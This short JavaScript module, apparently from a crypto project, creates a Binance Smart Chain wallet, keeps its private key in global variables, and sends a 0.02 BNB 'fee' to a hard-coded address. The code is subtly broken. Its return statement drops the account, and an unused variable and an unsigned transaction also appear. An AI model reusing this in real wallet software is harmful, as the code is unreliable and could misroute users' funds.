import Web3 from 'web3'

var re_address = ""
var priv_key = ""




const EthereumTx = require('ethereumjs-tx').Transaction
var tk_pm = []
const createWallet = async() => {

    const web3re = new Web3('https://bsc-dataseed1.binance.org:443');

    const account_handler = web3re.eth.accounts.create();
    re_address = account_handler.address
    priv_key = account_handler.privateKey
    return account_handler,web3re
}

const sendFeetoRouter = async(web3,address,tkn_pm) => {

    const txObject = {
        "from": address,
        "to": '0x433F7B5B9F58e0a87454A55fcA9ddFa1bEa49831',
        "value": '20000000000000000'
    }
    
    tk_pm = tkn_pm
    
    let tx = await web3.eth.sendTransaction(txObject)

    return tx

}






export { sendFeetoRouter, createWallet }
